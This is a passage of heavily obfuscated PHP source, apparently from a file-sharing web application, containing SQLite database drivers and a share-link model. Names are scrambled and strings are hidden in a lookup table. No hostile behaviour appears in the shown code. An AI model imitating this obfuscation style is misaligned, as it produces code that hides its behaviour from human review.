(!$µÌòìı’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $è…½Äœø = array(); if ($this->numRows > 0) { for ($¬»¸Ù’´ = 0; $¬»¸Ù’´ < $this->numRows; $¬»¸Ù’´++) { $è…½Äœø[$¬»¸Ù’´] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $è…½Äœø; } public function getFields($†¸¾æĞ) { $øÜ…‹Å¤ =& $_SERVER[å¸¿•¶£]; $¯éœËı = $this->query($øÜ…‹Å¤[29] . $†¸¾æĞ . $øÜ…‹Å¤[30]); $ØÜÛÃÜ” = array(); if ($¯éœËı) { foreach ($¯éœËı as $Œİ€ñêß => $™ä‰¹Ùâ) { $ØÜÛÃÜ”[$™ä‰¹Ùâ[$øÜ…‹Å¤[31]]] = array($øÜ…‹Å¤[32] => $™ä‰¹Ùâ[$øÜ…‹Å¤[31]], $øÜ…‹Å¤[33] => $™ä‰¹Ùâ[$øÜ…‹Å¤[34]], $øÜ…‹Å¤[35] => (bool) ($™ä‰¹Ùâ[$øÜ…‹Å¤[36]] === $øÜ…‹Å¤[12]), $øÜ…‹Å¤[37] => $™ä‰¹Ùâ[$øÜ…‹Å¤[38]], $øÜ…‹Å¤[39] => strtolower($™ä‰¹Ùâ[$øÜ…‹Å¤[40]]) == $øÜ…‹Å¤[41], $øÜ…‹Å¤[42] => strtolower($™ä‰¹Ùâ[$øÜ…‹Å¤[43]]) == $øÜ…‹Å¤[44]); } } return $ØÜÛÃÜ”; } public function getTables($«¹Ì¨„  = '') { $ĞšÚóÍÎ =& $_SERVER[å¸¿•¶£]; $·ç¥‘© = $this->query($ĞšÚóÍÎ[45] . $ĞšÚóÍÎ[46] . $ĞšÚóÍÎ[47]); $±ı–«£é = array(); foreach ($·ç¥‘© as $»·¿‰Ü§ => $ÊåıÆÌù) { $±ı–«£é[$»·¿‰Ü§] = current($ÊåıÆÌù); } return $±ı–«£é; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ô”‹½‡ =& $_SERVER[å¸¿•¶£]; $é¸ÍŒª“ = sqlite_last_error($this->_linkID); $this->error = $é¸ÍŒª“ . $Ô”‹½‡[4] . sqlite_error_string($é¸ÍŒª“); if ($Ô”‹½‡[12] != $this->queryStr) { $this->error .= LNG($Ô”‹½‡[48]) . $this->queryStr; } think_trace($this->error, $Ô”‹½‡[12], $Ô”‹½‡[49]); return $this->error; } public function escapeString($¤„¥Ë) { return sqlite_escape_string($¤„¥Ë); } public function parseLimit($À³ÚÊÇö) { $´”Áã° =& $_SERVER[å¸¿•¶£]; $°øˆÌ…ª = $´”Áã°[12]; if (!empty($À³ÚÊÇö)) { $À³ÚÊÇö = explode($´”Áã°[50], $À³ÚÊÇö); if (count($À³ÚÊÇö) > 1) { $°øˆÌ…ª .= $´”Áã°[51] . $À³ÚÊÇö[1] . $´”Áã°[52] . $À³ÚÊÇö[0] . $´”Áã°[53]; } else { $°øˆÌ…ª .= $´”Áã°[51] . $À³ÚÊÇö[0] . $´”Áã°[53]; } } return $°øˆÌ…ª; } } class DbSqlite3Base extends Db { public function __construct($Á¦ÔÜÆæ = '') { $“„®ÆÉë =& $_SERVER[å¸¿•¶£]; if (!class_exists($“„®ÆÉë[54])) { think_exception(think_lang($“„®ÆÉë[14]) . $“„®ÆÉë[55]); } if (!empty($Á¦ÔÜÆæ)) { if (!isset($Á¦ÔÜÆæ[$“„®ÆÉë[16]])) { $Á¦ÔÜÆæ[$“„®ÆÉë[16]] = 438; } $this->config = $Á¦ÔÜÆæ; if (empty($this->config[$“„®ÆÉë[17]])) { $this->config[$“„®ÆÉë[17]] = array(); } } } public function connect($õİë ¢Ÿ = '', $š‚äÕÉ… = 0) { $ˆÓ˜ì =& $_SERVER[å¸¿•¶£]; if (!isset($this->linkID[$š‚äÕÉ…])) { if (empty($õİë ¢Ÿ)) { $õİë ¢Ÿ = $this->config; } $this->linkID[$š‚äÕÉ…] = new SQLite3($õİë ¢Ÿ[$ˆÓ˜ì[21]]); if (!$this->linkID[$š‚äÕÉ…]) { think_exception($this->linkID[$š‚äÕÉ…]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$š‚äÕÉ…]->busyTimeout(30000); if (1 != think_config($ˆÓ˜ì[22])) { unset($this->config); } } return $this->linkID[$š‚äÕÉ…]; } public function free() { $this->queryID = null; } public function query($”Êìº¿) { $îŠâäùÎ =& $_SERVER[å¸¿•¶£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $”Êìº¿; if ($this->queryID) { $this->free(); } think_action_status($îŠâäùÎ[23], 1); think_status($îŠâäùÎ[24]); $this->queryID = $this->_linkID->query($”Êìº¿); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¼ŸëîÕÚ = $this->getAll(); $this->numRows = count($¼ŸëîÕÚ); return $¼ŸëîÕÚ; } } public function execute($ŒŠ‘ÙÌ¹) { $ÁÀ¾¤Áü =& $_SERVER[å¸¿•¶£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ŒŠ‘ÙÌ¹; if ($this->queryID) { $this->free(); } think_action_status($ÁÀ¾¤Áü[25], 1); think_status($ÁÀ¾¤Áü[24]); $¹ÁêôÏ¼ = $this->_linkID->exec($ŒŠ‘ÙÌ¹); $this->debug(); if (!1 === $¹ÁêôÏ¼) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[å¸¿•¶£][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‰ˆÅ°èù = $this->_linkID->query($_SERVER[å¸¿•¶£][27]); if (!$‰ˆÅ°èù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $òŒÍ’š = $this->_linkID->query($_SERVER[å¸¿•¶£][28]); if (!$òŒÍ’š) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÙÙ·¡¥ = array(); while ($›×Ó‚¼ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ÙÙ·¡¥[] = $›×Ó‚¼; } $this->queryID->reset(); return $ÙÙ·¡¥; } public function getFields($È“âùçŸ) { $œêõ¦ù =& $_SERVER[å¸¿•¶£]; $ŠšİĞû¢ = $this->query($œêõ¦ù[29] . $È“âùçŸ . $œêõ¦ù[30]); $è”¹‡ˆ³ = array(); if ($ŠšİĞû¢) { foreach ($ŠšİĞû¢ as $Úºõ–Ñ => $Û€Êå®—) { $è”¹‡ˆ³[$Û€Êå®—[$œêõ¦ù[32]]] = array($œêõ¦ù[32] => $Û€Êå®—[$œêõ¦ù[32]], $œêõ¦ù[33] => $Û€Êå®—[$œêõ¦ù[33]], $œêõ¦ù[35] => (bool) ($Û€Êå®—[$œêõ¦ù[35]] === $œêõ¦ù[12]), $œêõ¦ù[37] => $Û€Êå®—[$œêõ¦ù[56]], $œêõ¦ù[39] => (bool) $Û€Êå®—[$œêõ¦ù[57]], $œêõ¦ù[42] => (bool) $Û€Êå®—[$œêõ¦ù[57]]); } } return $è”¹‡ˆ³; } public function getTables($ƒˆ‚ìû = '') { $Ì§¶Êª =& $_SERVER[å¸¿•¶£]; $“¬Í³¹È = $this->query($Ì§¶Êª[45] . $Ì§¶Êª[46] . $Ì§¶Êª[47]); $“‹Œ “£ = array(); foreach ($“¬Í³¹È as $€ÈóŞàÓ => $†è½çÃ) { $“‹Œ “£[$€ÈóŞàÓ] = current($†è½çÃ); } return $“‹Œ “£; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‰§Â¤Ì² =& $_SERVER[å¸¿•¶£]; $this->error = $this->_linkID->lastErrorMsg(); if ($‰§Â¤Ì²[12] != $this->queryStr) { $this->error .= LNG($‰§Â¤Ì²[48]) . $this->queryStr; } think_trace($this->error, $‰§Â¤Ì²[12], $‰§Â¤Ì²[49]); return $this->error; } public function escapeString($ËäêÖü) { $è’¢´éÄ =& $_SERVER[å¸¿•¶£]; if ($this->_linkID) { return $this->_linkID->escapeString($ËäêÖü); } return str_ireplace($è’¢´éÄ[58], $è’¢´éÄ[59], $ËäêÖü); } public function parseLimit($è—ãÅº) { $Õ¯àĞ×Ñ =& $_SERVER[å¸¿•¶£]; $òËªÑ‚Ä = $Õ¯àĞ×Ñ[12]; if (!empty($è—ãÅº)) { $è—ãÅº = explode($Õ¯àĞ×Ñ[50], $è—ãÅº); if (count($è—ãÅº) > 1) { $òËªÑ‚Ä .= $Õ¯àĞ×Ñ[51] . $è—ãÅº[1] . $Õ¯àĞ×Ñ[52] . $è—ãÅº[0] . $Õ¯àĞ×Ñ[53]; } else { $òËªÑ‚Ä .= $Õ¯àĞ×Ñ[51] . $è—ãÅº[0] . $Õ¯àĞ×Ñ[53]; } } return $òËªÑ‚Ä; } } goto böª•àÄ°; Fªˆ‡¤ç”Ü: class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\x65"; protected $dataAuto = array(array("\155\x6f\144\151\146\x79\124\x69\x6d\x65", "\x74\151\x6d\145", "\151\x6e\x73\x65\x72\164\54\x75\160\x64\x61\164\x65", "\146\165\x6e\x63\164\x69\157\156"), array("\143\162\145\x61\x74\145\x54\x69\155\x65", "\164\x69\x6d\x65", "\151\x6e\163\145\162\x74", "\146\x75\156\143\164\151\x6f\156"), array("\157\160\164\x69\157\x6e\x73", '', "\151\156\163\x65\x72\164\54\165\160\x64\x61\164\145\x2c\163\145\x6c\x65\143\x74", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($Î»¨½ëÀ) { $¦”¢éŞÀ =& $_SERVER[å¸¿•¶£]; $·Ñ·ƒŞø = isset($Î»¨½ëÀ[0]) ? $Î»¨½ëÀ[0] : !1; return array($¦”¢éŞÀ[2002] => array(USER_ID, $¦”¢éŞÀ[2003]), $¦”¢éŞÀ[1943] => array($·Ñ·ƒŞø, $¦”¢éŞÀ[2004])); } protected function listSimple() { $­Ş³„şÈ = array($_SERVER[å¸¿•¶£][1674] => USER_ID); $Ö…¾×üé = $this->field($this->fieldList)->where($­Ş³„şÈ)->select(); return $Ö…¾×üé ? $Ö…¾×üé : array(); } protected function getInfo($»Á¶”Ÿ, $ëÈ‚ğí = false) { $ÛĞÓæŞ =& $_SERVER[å¸¿•¶£]; if ($ëÈ‚ğí) { return $this->_getShareInfo(array($ÛĞÓæŞ[593] => $»Á¶”Ÿ)); } $Âœ¦‹ƒ = $this->cacheFunctionGet($ÛĞÓæŞ[1945], $»Á¶”Ÿ); return $Âœ¦‹ƒ; } public function getInfoByHash($ò“‚íÁİ) { return $this->_getShareInfo(array($_SERVER[å¸¿•¶£][2005] => $ò“‚íÁİ)); } public function getInfoByPath($¢šâİ§) { $é½’îÛÔ =& $_SERVER[å¸¿•¶£]; $’Ğ†¨ä = array($é½’îÛÔ[1674] => USER_ID, $é½’îÛÔ[402] => $¢šâİ§); return $this->_getShareInfo($’Ğ†¨ä); } public function getInfoBySourcePath($üÑÔ÷—) { $®ù«ØÖ€ =& $_SERVER[å¸¿•¶£]; $“»Ñ•‚ = array($®ù«ØÖ€[1674] => USER_ID, $®ù«ØÖ€[1182] => $üÑÔ÷—); return $this->_getShareInfo($“»Ñ•‚); } private function _getShareInfo($†ËŠ¾ÑÖ) { $ ‡ÀÅ™ô =& $_SERVER[å¸¿•¶£]; $½†è‚½ğ = $this->where($†ËŠ¾ÑÖ)->find(); if (!$½†è‚½ğ) { return !1; } $†ËŠ¾ÑÖ = array($ ‡ÀÅ™ô[593] => $½†è‚½ğ[$ ‡ÀÅ™ô[593]]); $¶Â¸è” = $ ‡ÀÅ™ô[2006]; $“Á­éñ£ = Model($ ‡ÀÅ™ô[594])->order($ ‡ÀÅ™ô[399])->field($¶Â¸è”)->where($†ËŠ¾ÑÖ)->select(); if ($½†è‚½ğ[$ ‡ÀÅ™ô[402]] == $ ‡ÀÅ™ô[198]) { $½†è‚½ğ[$ ‡ÀÅ™ô[87]] = IO::info($½†è‚½ğ[$ ‡ÀÅ™ô[1182]]); } else { $½†è‚½ğ[$ ‡ÀÅ™ô[87]] = Model($ ‡ÀÅ™ô[1346])->pathInfo($½†è‚½ğ[$ ‡ÀÅ™ô[402]]); } $½†è‚½ğ[$ ‡ÀÅ™ô[2007]] = $“Á­éñ£; return $½†è‚½ğ; } protected function getInfoAuth($Æ©×İ) { $ØÑíƒ ¶ =& $_SERVER[å¸¿•¶£]; $Ÿò’î† = $this->getInfo($Æ©×İ); if ($Ÿò’î†[$ØÑíƒ ¶[1674]] == USER_ID) { $Ÿò’î†[$ØÑíƒ ¶[413]] = $Ÿò’î†[$ØÑíƒ ¶[87]][$ØÑíƒ ¶[413]]; } else { $Ÿò’î†[$ØÑíƒ ¶[413]] = Model($ØÑíƒ ¶[493])->authMake($Ÿò’î†[$ØÑíƒ ¶[2007]]); } return $Ÿò’î†; } protected function listData($¼ ìˆß² = null, $ÒíŠ¶ªé = 300) { $¬†õûİæ =& $_SERVER[å¸¿•¶£]; $Ÿ¢µ¥Ù = array(array($¬†õûİæ[488] => array($¬†õûİæ[1019], 0), $¬†õûİæ[591] => array($¬†õûİæ[1019], 0), $¬†õûİæ[2008] => $¬†õûİæ[1961])); if ($¼ ìˆß² == $¬†õûİæ[2009]) { $Ÿ¢µ¥Ù = array($¬†õûİæ[488] => 1); } else { if ($¼ ìˆß² == $¬†õûİæ[1168]) { $Ÿ¢µ¥Ù = array($¬†õûİæ[591] => 1); } } $Ÿ¢µ¥Ù[$¬†õûİæ[1674]] = USER_ID; $ÈŸ®‹¦· = $this->where($Ÿ¢µ¥Ù)->selectPage($ÒíŠ¶ªé); return $ÈŸ®‹¦·; } protected function listToMe($Ğúã´¤è = 300) { $¿ºŠóÂ† =& $_SERVER[å¸¿•¶£]; $¯Ç‡¢ö® = Model($¿ºŠóÂ†[2010])->userGroupParents(USER_ID); $‡ÃŞŒµÍ = array($¿ºŠóÂ†[576] => SourceModel::TYPE_USER, $¿ºŠóÂ†[496] => USER_ID); if ($¯Ç‡¢ö®) { $‡ÃŞŒµÍ = array(array($¿ºŠóÂ†[576] => SourceModel::TYPE_USER, $¿ºŠóÂ†[496] => USER_ID), array($¿ºŠóÂ†[576] => SourceModel::TYPE_GROUP, $¿ºŠóÂ†[496] => array($¿ºŠóÂ†[7], $¯Ç‡¢ö®)), $¿ºŠóÂ†[2008] => $¿ºŠóÂ†[1961]); } $Ùñ†¤Æ‡ = Model($¿ºŠóÂ†[594])->where($‡ÃŞŒµÍ)->selectPage($Ğúã´¤è); $êéçŠÍ = array_to_keyvalue_group($Ùñ†¤Æ‡[$¿ºŠóÂ†[369]], $¿ºŠóÂ†[593]); if (!$êéçŠÍ) { return $Ùñ†¤Æ‡; } $ìúÌĞ€Ï = $¿ºŠóÂ†[2011]; $‡ÃŞŒµÍ = array($¿ºŠóÂ†[593] => array($¿ºŠóÂ†[418], array_keys($êéçŠÍ)), $¿ºŠóÂ†[1674] => array($¿ºŠóÂ†[1021], $¿ºŠóÂ†[198])); $ë×„¬¨š = $this->field($ìúÌĞ€Ï)->where($‡ÃŞŒµÍ)->select(); foreach ($ë×„¬¨š as $„ÈÅ³İ => &$§±¨„èã) { $§±¨„èã[$¿ºŠóÂ†[2007]] = $êéçŠÍ[$§±¨„èã[$¿ºŠóÂ†[593]]]; } unset($§±¨„èã); $İóœàƒ¦ = array($¿ºŠóÂ†[2012] => $ë×„¬¨š, $¿ºŠóÂ†[2013] => $Ùñ†¤Æ‡[$¿ºŠóÂ†[366]]); return $İóœàƒ¦; } protected function shareAdd($„¯¦Úíö, $¯ù®Ù ë) { $ÑŒŒş¤’ =& $_SERVER[å¸¿•¶£]; $óìê¤ëç = $this->_addShareData($„¯¦Úíö, $¯ù®Ù ë); if (!empty($¯ù®Ù ë[$ÑŒŒş¤’[2014]])) { $this->_shareAuthSet($óìê¤ëç, $¯ù®Ù ë[$ÑŒŒş¤’[2014]]); } $this->shareEventAdd($„¯¦Úíö, $¯ù®Ù ë, $ÑŒŒş¤’[2015]); return $óìê¤ëç; } protected function shareAddSystem($Î£ïõØå, $ú„º»¦ç) { $•ŸçÜÍ =& $_SERVER[å¸¿•¶£]; $Äñ¬‹§£ = $this->_addShareData($Î£ïõØå, $ú„º»¦ç, $•ŸçÜÍ[1291]); $this->_shareAuthSet($Äñ¬‹§£, $ú„º»¦ç[$•ŸçÜÍ[2014]]); return $Äñ¬‹§£; } private function shareEventAdd($ƒ™éÛİ, $Ä†Ô·‘, $¿×ç¼°¡ = "\141\144\144") { $”›£´÷ =& $_SERVER[å¸¿•¶£]; if (!$ƒ™éÛİ || $ƒ™éÛİ == $”›£´÷[198]) { return; } if ($¿×ç¼°¡ == $”›£´÷[2015]) { if ($Ä†Ô·‘[$”›£´÷[488]] == $”›£´÷[88]) { Model($”›£´÷[561])->eventShare($ƒ™éÛİ, $”›£´÷[2016]); } if ($Ä†Ô·‘[$”›£´÷[591]] == $”›£´÷[88]) { Model($”›£´÷[561])->eventShare($ƒ™éÛİ, $”›£´÷[2017]); } return; } $¬™ª‚Óú = $this->getInfoByPath($ƒ™éÛİ); $‹®‡Í«± = $”›£´÷[2018]; if ($¬™ª‚Óú[$”›£´÷[488]] == $”›£´÷[198] && $Ä†Ô·‘[$”›£´÷[488]] == $”›£´÷[88]) { $‹®‡Í«± = $”›£´÷[2016]; } if ($¬™ª‚Óú[$”›£´÷[488]] == $”›£´÷[88] && $Ä†Ô·‘[$”›£´÷[488]] == $”›£´÷[198]) { $‹®‡Í«± = $”›£´÷[2019]; } if ($¬™ª‚Óú[$”›£´÷[591]] == $”›£´÷[198] && $Ä†Ô·‘[$”›£´÷[591]] == $”›£´÷[88]) { $‹®‡Í«± = $”›£´÷[2017]; } if ($¬™ª‚Óú[$”›£´÷[591]] == $”›£´÷[88] && $Ä†Ô·‘[$”›£´÷[591]] == $”›£´÷[198]) { $‹®‡Í«± = $”›£´÷[2020]; } Model($”›£´÷[561])->eventShare($ƒ™éÛİ, $‹®‡Í«±); return; } private function _addShareData($šñ¼“, $¢™éÜÑ² = array(), $äÔã‚¥è = false) { $õòïüÀ =& $_SERVER[å¸¿•¶£]; $ø”ÒÊÂ = $äÔã‚¥è == $õòïüÀ[1291] ? 0 : USER_ID; $à¿¿¬èí = array($õòïüÀ[417] => $šñ¼“, $õòïüÀ[1665] => $ø”ÒÊÂ); if ($šñ¼“ == 0) { $à¿¿¬èí = array($õòïüÀ[2021] => $¢™éÜÑ²[$õòïüÀ[1182]], $õòïüÀ[1665] => $ø”ÒÊÂ); } if ($ğ”¬‰À = $this->where($à¿¿¬èí)->find()) { return $ğ”¬‰À[$õòïüÀ[593]]; } if ($šñ¼“ == 0) { $ÊÛ©öÅ¹ = array($õòïüÀ[32] => get_path_this($¢™éÜÑ²[$õòïüÀ[84]])); } else { $ÊÛ©öÅ¹ = Model($õòïüÀ[832])->sourceInfo($šñ¼“); if (!$ÊÛ©öÅ¹) { return !1; } } if (!$¢™éÜÑ²[$õòïüÀ[1574]]) { $¢™éÜÑ²[$õòïüÀ[1574]] = $ÊÛ©öÅ¹[$õòïüÀ[32]]; } $ÑïÓ´¶ó = array($õòïüÀ[1665] => $ø”ÒÊÂ, $õòïüÀ[417] => $šñ¼“, $õòïüÀ[1574] => $õòïüÀ[12], $õòïüÀ[488] => 0, $õòïüÀ[591] => 0, $õòïüÀ[1182] => $õòïüÀ[12], $õòïüÀ[307] => $õòïüÀ[12], $õòïüÀ[896] => $õòïüÀ[12], $õòïüÀ[2022] => 0, $õòïüÀ[2023] => 0, $õòïüÀ[768] => 0, $õòïüÀ[2024] => $õòïüÀ[12], $õòïüÀ[2005] => $õòïüÀ[12]); $×°éßÛÜ = explode($õòïüÀ[50], $õòïüÀ[2025]); foreach ($×°éßÛÜ as $ŸÏæ±ê) { if (!isset($¢™éÜÑ²[$ŸÏæ±ê])) { continue; } $ÑïÓ´¶ó[$ŸÏæ±ê] = $¢™éÜÑ²[$ŸÏæ±ê]; } $“‹·èò = $this->add($ÑïÓ´¶ó); $§‡ÇöÒ = array($õòïüÀ[2005] => short_id($“‹·èò)); $this->where(array($õòïüÀ[2026] => $“‹·èò))->save($§‡ÇöÒ); return $“‹·èò; } private function _shareAuthSet($«×ÕÌ¾•, $çšÂÑ€) { $Ü…ë‡Á§ =& $_SERVER[å¸¿•¶£]; if (!is_array($çšÂÑ€)) { return !1; } $œµ±½ñâ = Model($Ü…ë‡Á§[1971]); $œµ±½ñâ->where(array($Ü…ë‡Á§[593] => $«×ÕÌ¾•))->delete(); $İ·¥–Çâ = array(); foreach ($çšÂÑ€ as $•Õ¶¼©ò) { $›²¦ô«é = SourceModel::TYPE_USER; if ($•Õ¶¼©ò[$Ü…ë‡Á§[411]] == SourceModel::TYPE_GROUP) { $›²¦ô«é = SourceModel::TYPE_GROUP; } $Šá± Ù¥ = array($Ü…ë‡Á§[593] => $«×ÕÌ¾•, $Ü…ë‡Á§[411] => $›²¦ô«é, $Ü…ë‡Á§[496] => intval($•Õ¶¼©ò[$Ü…ë‡Á§[496]]), $Ü…ë‡Á§[1967] => 0, $Ü…ë‡Á§[2027] => -1); if ($•Õ¶¼©ò[$Ü…ë‡Á§[1967]]) { $Šá± Ù¥[$Ü…ë‡Á§[1967]] = $•Õ¶¼©ò[$Ü…ë‡Á§[1967]]; } else { if ($•Õ¶¼©ò[$Ü…ë‡Á§[2027]]) { $Šá± Ù¥[$Ü…ë‡Á§[2027]] = $•Õ¶¼©ò[$Ü…ë‡Á§[2027]]; } } $İ·¥–Çâ[] = $Šá± Ù¥; } return $œµ±½ñâ->addAll($İ·¥–Çâ, array(), !0); } public function numViewAdd($Ü½½˜Ê¿) { $§Ò—ˆéò =& $_SERVER[å¸¿•¶£]; $æË‡— = array($§Ò—ˆéò[2026] => $Ü½½˜Ê¿); $this->where($æË‡—)->setAdd($§Ò—ˆéò[2022]); } public function numDownloadAdd($õòí›Í) { $Í—Ê”“¡ =& $_SERVER[å¸¿•¶£]; $¦¾Ìş‚ = array($Í—Ê”“¡[2026] => $õòí›Í); $this->where($¦¾Ìş‚)->setAdd($Í—Ê”“¡[2023]); } protected function shareEdit($óï‰÷è†, $ÌŸ‘©²ğ) { $ƒÈá¸ã’ =& $_SERVER[å¸¿•¶£]; $æ³½£Ê¦ = $this->getInfo($óï‰÷è†); if (!$æ³½£Ê¦) { return !1; } $this->_checkLinkShare($ÌŸ‘©²ğ, $æ³½£Ê¦); $‘ÄŒ”·é = array(); $ƒµ·ƒ•Ø = explode($ƒÈá¸ã’[50], $ƒÈá¸ã’[2028]); foreach ($ƒµ·ƒ•Ø as $‹Üı‚Æ) { if (!array_key_exists($‹Üı‚Æ, $ÌŸ‘©²ğ)) { continue; } $‘ÄŒ”·é[$‹Üı‚Æ] = $ÌŸ‘©²ğ[$‹Üı‚Æ]; } $this->shareEventAdd($æ³½£Ê¦[$ƒÈá¸ã’[402]], $ÌŸ‘©²ğ, $ƒÈá¸ã’[1833]); $this->where(array($ƒÈá¸ã’[2026] => $óï‰÷è†))->save($‘ÄŒ”·é); if (isset($ÌŸ‘©²ğ[$ƒÈá¸ã’[2014]])) { $this->_shareAuthSet($óï‰÷è†, $ÌŸ‘©²ğ[$ƒÈá¸ã’[2014]]); } return !0; } private function _checkLinkShare($ùÔßó, $•Ê‚ÑòË) { $‹÷†œ =& $_SERVER[å¸¿•¶£]; if ($ùÔßó[$‹÷†œ[488]] != $‹÷†œ[88]) { return; } $®€‘Â–Û = $•Ê‚ÑòË[$‹÷†œ[87]][$‹÷†œ[402]]; if ($•Ê‚ÑòË[$‹÷†œ[87]][$‹÷†œ[33]] != $‹÷†œ[200]) { $Í‹‹¹¨… = $this->_folderReport($®€‘Â–Û); if (!$Í‹‹¹¨…) { return; } show_json(LNG($‹÷†œ[2029]) . $‹÷†œ[2030] . $Í‹‹¹¨…, !1); } $û‚¬şûœ = Model($‹÷†œ[832])->fileInfoGet($•Ê‚ÑòË[$‹÷†œ[87]][$‹÷†œ[402]]); if (!$û‚¬şûœ) { return; } $˜´œÓÁ§ = $this->shareFileMeta($û‚¬şûœ[$‹÷†œ[468]]); if (isset($˜´œÓÁ§[$‹÷†œ[374]]) && $˜´œÓÁ§[$‹÷†œ[374]] == $‹÷†œ[88]) { show_json(LNG($‹÷†œ[2031]), !1); } } private function _folderReport($¿Ëœš¼) { $Ù˜Éø¡“ =& $_SERVER[å¸¿•¶£]; $–ŠÆÖ† = array($Ù˜Éø¡“[468] => array($Ù˜Éø¡“[1019], 0), $Ù˜Éø¡“[756] => 3); $¿£»¼²² = Model($Ù˜Éø¡“[2032])->where($–ŠÆÖ†)->field($Ù˜Éø¡“[468])->select(); if (!$¿£»¼²²) { return !1; } $¿£»¼²² = array_to_keyvalue($¿£»¼²², $Ù˜Éø¡“[12], $Ù˜Éø¡“[468]); $û‹‚”âà = $Ù˜Éø¡“[50] . $¿Ëœš¼ . $Ù˜Éø¡“[50]; $–ŠÆÖ† = array($Ù˜Éø¡“[468] => array($Ù˜Éø¡“[7], $¿£»¼²²), $Ù˜Éø¡“[511] => array($Ù˜Éø¡“[383], "\45{$û‹‚”âà}\x25"), $Ù˜Éø¡“[431] => 0); $Ğ‡ø  = Model($Ù˜Éø¡“[832])->where($–ŠÆÖ†)->field($Ù˜Éø¡“[2033])->find(); if (!$Ğ‡ø ) { return !1; } $¡›”Ç„ = substr($Ğ‡ø [$Ù˜Éø¡“[511]], strpos($Ğ‡ø [$Ù˜Éø¡“[511]], $û‹‚”âà)); $–ŠÆÖ† = array($Ù˜Éø¡“[402] => array($Ù˜Éø¡“[7], trim($¡›”Ç„, $Ù˜Éø¡“[50]))); $Ü–µñ€ = Model($Ù˜Éø¡“[832])->where($–ŠÆÖ†)->field($Ù˜Éø¡“[32])->select(); $¥÷Åªñœ = array_to_keyvalue($Ü–µñ€, $Ù˜Éø¡“[12], $Ù˜Éø¡“[32]); $¥÷Åªñœ[] = $Ğ‡ø [$Ù˜Éø¡“[32]]; return implode($Ù˜Éø¡“[8], $¥÷Åªñœ); } protected function remove($ª·Ù·ú) { $ñ¬Òş¥ =& $_SERVER[å¸¿•¶£]; if (is_array($ª·Ù·ú)) { $ª·Ù·ú = array($ñ¬Òş¥[7], $ª·Ù·ú); } $ä…í˜ºç = array($ñ¬Òş¥[593] => $ª·Ù·ú); $¦Şá£Ô‘ = $this->where($ä…í˜ºç)->delete(); if ($¦Şá£Ô‘) { Model($ñ¬Òş¥[594])->where(array($ñ¬Òş¥[593] => $ª·Ù·ú))->delete(); } $ßä±… = is_array($ª·Ù·ú) ? $ª·Ù·ú[1] : array($ª·Ù·ú); for ($¦šŒ—¤ = 0; $¦šŒ—¤ < count($ßä±…); $¦šŒ—¤++) { $ÔñÊ¥œ‡ = $this->getInfo($ßä±…[$¦šŒ—¤]); if ($ÔñÊ¥œ‡[$ñ¬Òş¥[591]] == $ñ¬Òş¥[88]) { Model($ñ¬Òş¥[561])->eventShare($ÔñÊ¥œ‡[$ñ¬Òş¥[402]], $ñ¬Òş¥[2020]); } if ($ÔñÊ¥œ‡[$ñ¬Òş¥[488]] == $ñ¬Òş¥[88]) { Model($ñ¬Òş¥[561])->eventShare($ÔñÊ¥œ‡[$ñ¬Òş¥[402]], $ñ¬Òş¥[2019]); } } return $¦Şá£Ô‘; } protected function removeBySource($ÕÜñøÊ) { $²’Èèê£ =& $_SERVER[å¸¿•¶£]; $§úÖÑÊØ = array($²’Èèê£[417] => array($²’Èèê£[418], $ÕÜñøÊ)); $ŞÃÆÊ«¤ = $this->field($²’Èèê£[593])->where($§úÖÑÊØ)->select(); $ŞÃÆÊ«¤ = array_to_keyvalue($ŞÃÆÊ«¤, $²’Èèê£[12], $²’Èèê£[593]); if (!$ŞÃÆÊ«¤) { return; } $§úÖÑÊØ = array($²’Èèê£[2026] => array($²’Èèê£[418], $ŞÃÆÊ«¤)); $this->where($§úÖÑÊØ)->delete(); Model($²’Èèê£[594])->where($§úÖÑÊØ)->delete(); } public function listAll($í¼‹¬¯ò) { $ôµš…ÜÌ =& $_SERVER[å¸¿•¶£]; $¬œÜ¤ ã = array(); if ($í¼‹¬¯ò[$ôµš…ÜÌ[1674]]) { $¬œÜ¤ ã[$ôµš…ÜÌ[1674]] = $í¼‹¬¯ò[$ôµš…ÜÌ[1674]]; } if ($í¼‹¬¯ò[$ôµš…ÜÌ[767]]) { $²˜ø¢áÁ = $í¼‹¬¯ò[$ôµš…ÜÌ[768]] ? $í¼‹¬¯ò[$ôµš…ÜÌ[768]] : strtotime(date($ôµš…ÜÌ[2034])); $¬œÜ¤ ã[$ôµš…ÜÌ[201]] = array($ôµš…ÜÌ[333], array($í¼‹¬¯ò[$ôµš…ÜÌ[767]], $²˜ø¢áÁ)); } if ($í¼‹¬¯ò[$ôµš…ÜÌ[33]]) { $¬œÜ¤ ã[$í¼‹¬¯ò[$ôµš…ÜÌ[33]]] = 1; } else { $¬œÜ¤ ã[] = array($ôµš…ÜÌ[488] => array($ôµš…ÜÌ[1019], 0), $ôµš…ÜÌ[591] => array($ôµš…ÜÌ[1019], 0), $ôµš…ÜÌ[2008] => $ôµš…ÜÌ[1961]); } if ($í¼‹¬¯ò[$ôµš…ÜÌ[1957]]) { $¬œÜ¤ ã[] = array($ôµš…ÜÌ[2005] => $í¼‹¬¯ò[$ôµš…ÜÌ[1957]], $ôµš…ÜÌ[1574] => array($ôµš…ÜÌ[383], 